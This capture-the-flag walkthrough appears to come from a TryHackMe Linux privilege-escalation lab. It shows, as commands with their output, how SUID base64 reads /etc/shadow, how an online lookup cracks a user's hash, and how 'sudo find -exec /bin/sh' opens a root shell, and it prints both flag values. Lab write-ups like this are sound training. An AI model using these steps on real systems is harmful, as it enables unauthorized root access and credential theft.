1. Login to the system using provided user credentials (leonard - Penny123)
2. Look for commands we can run as root without being root by typing below command. We get to know that leonard is not in sudoers list.
```
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-201-83-26.
```
3. We looked for suid permissions so we know which commands we can run as root.
 ```
 find / -type f -perm  -4000 -ls 2>/dev/null
   ```
4. We found out that the base64 and passwd command has suid permissions. So we first ran below command to identify is there any other user than leonard and user missy was identified. Then, we ran base64 command to look for user missy's password hash in /etc/shadow file for that we perform below commands. 
```
cat /etc/passwd
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```
5. We got required password hash and using hashes.com we retrieved password form it. (missy - password1) {Horizontal privilege escalation}
6. Then we search for flag using find command.
```
find / -name flag* 2>/dev/null
```
7. Then we executed the file using below command.
```
cat /home/missy/Documents/flag1.txt
THM-42828719920544
```
8. Once again we searched for commands we can run as root without being root by typing 'sudo -l'.
```
sudo -l
Matching Defaults entries for missy on ip-10-201-83-26:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-201-83-26:
    (ALL) NOPASSWD: /usr/bin/find
```
9. We got to know that user missy can run find command as root. So using GTFobins we run below command and received root access.
```
sudo find . -exec /bin/sh \; -quit
sh-4.2# whoami
root
```
10. Then again we searched for flag using find command and executed it.
```
find / -name flag* 2>/dev/null
cat /home/rootflag/flag2.txt
THM-168824782390238
```
